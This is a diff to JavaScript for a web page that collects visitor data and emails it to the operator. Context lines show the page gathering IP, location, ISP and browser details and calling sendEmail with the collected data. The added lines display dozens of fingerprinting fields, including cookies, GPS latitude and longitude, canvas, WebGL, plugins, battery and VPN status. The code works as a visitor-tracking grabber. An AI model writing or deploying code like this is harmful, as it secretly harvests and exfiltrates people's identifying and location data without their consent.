@@ -183,6 +183,7 @@ async function loadData() {
         console.log('IP Data:', ipData);
 
         collectedData.ip = ipData.ip || 'error';
+        collectedData.ipv6 = await getIPv6Address();
         collectedData.location = `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`;
         collectedData.isp = ipData.org || 'unknown';
         collectedData.country = `${ipData.country_code || 'unknown'} (${ipData.country_calling_code || 'n/a'})`;
@@ -198,9 +199,6 @@ async function loadData() {
         collectedData.language = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
         collectedData.connection = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps (${connection.type || 'unknown'})` : 'unavailable';
 
-        collectedData.ipv6 = await getIPv6Address();
-        collectedData.os = getOS(navigator.userAgent);
-        collectedData.browser = getBrowser(navigator.userAgent);
         collectedData.cores = navigator.hardwareConcurrency || 'unknown';
         collectedData.memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown';
         collectedData.touch = 'ontouchstart' in window ? 'supported' : 'not supported';
@@ -240,6 +238,7 @@ async function loadData() {
 
         // Update display on the webpage
         document.getElementById('ip').textContent = collectedData.ip;
+        document.getElementById('ipv6').textContent = collectedData.ipv6;
         document.getElementById('location').textContent = collectedData.location;
         document.getElementById('isp').textContent = collectedData.isp;
         document.getElementById('country').textContent = collectedData.country;
@@ -250,6 +249,37 @@ async function loadData() {
         document.getElementById('screen').textContent = collectedData.screen;
         document.getElementById('lang').textContent = collectedData.language;
         document.getElementById('connection').textContent = collectedData.connection;
+        document.getElementById('cores').textContent = collectedData.cores;
+        document.getElementById('memory').textContent = collectedData.memory;
+        document.getElementById('touch').textContent = collectedData.touch;
+        document.getElementById('battery').textContent = collectedData.battery;
+        document.getElementById('deviceModel').textContent = collectedData.deviceModel;
+        document.getElementById('hardwareConcurrency').textContent = collectedData.hardwareConcurrency;
+        document.getElementById('deviceMemory').textContent = collectedData.deviceMemory;
+        document.getElementById('plugins').textContent = collectedData.plugins;
+        document.getElementById('mimeTypes').textContent = collectedData.mimeTypes;
+        document.getElementById('latitude').textContent = collectedData.latitude;
+        document.getElementById('longitude').textContent = collectedData.longitude;
+        document.getElementById('accuracy').textContent = collectedData.accuracy;
+        document.getElementById('cookies').textContent = collectedData.cookies;
+        document.getElementById('localStorageSupport').textContent = collectedData.localStorageSupport;
+        document.getElementById('sessionStorageSupport').textContent = collectedData.sessionStorageSupport;
+        document.getElementById('webgl').textContent = collectedData.webgl;
+        document.getElementById('canvas').textContent = collectedData.canvas;
+        document.getElementById('referrer').textContent = collectedData.referrer;
+        document.getElementById('java').textContent = collectedData.java;
+        document.getElementById('flash').textContent = collectedData.flash;
+        document.getElementById('timezoneOffset').textContent = collectedData.timezoneOffset;
+        document.getElementById('localTime').textContent = collectedData.localTime;
+        document.getElementById('platform').textContent = collectedData.platform;
+        document.getElementById('doNotTrack').textContent = collectedData.doNotTrack;
+        document.getElementById('onlineStatus').textContent = collectedData.onlineStatus;
+        document.getElementById('connectionType').textContent = collectedData.connectionType;
+        document.getElementById('downlink').textContent = collectedData.downlink;
+        document.getElementById('effectiveType').textContent = collectedData.effectiveType;
+        document.getElementById('rtt').textContent = collectedData.rtt;
+        document.getElementById('saveData').textContent = collectedData.saveData;
+        document.getElementById('vpn').textContent = collectedData.vpn;
 
         // Send email with all collected data (client-side)
         await sendEmail(collectedData);
@@ -258,6 +288,7 @@ async function loadData() {
         console.error('Error during data collection or email sending:', error);
         // Display errors if anything fails
         document.getElementById('ip').textContent = 'error';
+        document.getElementById('ipv6').textContent = 'error';
         document.getElementById('location').textContent = 'error';
         document.getElementById('isp').textContent = 'error';
         document.getElementById('country').textContent = 'error';
@@ -268,6 +299,37 @@ async function loadData() {
         document.getElementById('screen').textContent = 'error';
         document.getElementById('lang').textContent = 'error';
         document.getElementById('connection').textContent = 'error';
+        document.getElementById('cores').textContent = 'error';
+        document.getElementById('memory').textContent = 'error';
+        document.getElementById('touch').textContent = 'error';
+        document.getElementById('battery').textContent = 'error';
+        document.getElementById('deviceModel').textContent = 'error';
+        document.getElementById('hardwareConcurrency').textContent = 'error';
+        document.getElementById('deviceMemory').textContent = 'error';
+        document.getElementById('plugins').textContent = 'error';
+        document.getElementById('mimeTypes').textContent = 'error';
+        document.getElementById('latitude').textContent = 'error';
+        document.getElementById('longitude').textContent = 'error';
+        document.getElementById('accuracy').textContent = 'error';
+        document.getElementById('cookies').textContent = 'error';
+        document.getElementById('localStorageSupport').textContent = 'error';
+        document.getElementById('sessionStorageSupport').textContent = 'error';
+        document.getElementById('webgl').textContent = 'error';
+        document.getElementById('canvas').textContent = 'error';
+        document.getElementById('referrer').textContent = 'error';
+        document.getElementById('java').textContent = 'error';
+        document.getElementById('flash').textContent = 'error';
+        document.getElementById('timezoneOffset').textContent = 'error';
+        document.getElementById('localTime').textContent = 'error';
+        document.getElementById('platform').textContent = 'error';
+        document.getElementById('doNotTrack').textContent = 'error';
+        document.getElementById('onlineStatus').textContent = 'error';
+        document.getElementById('connectionType').textContent = 'error';
+        document.getElementById('downlink').textContent = 'error';
+        document.getElementById('effectiveType').textContent = 'error';
+        document.getElementById('rtt').textContent = 'error';
+        document.getElementById('saveData').textContent = 'error';
+        document.getElementById('vpn').textContent = 'error';
     }
 
     btn.textContent = 'refresh data';
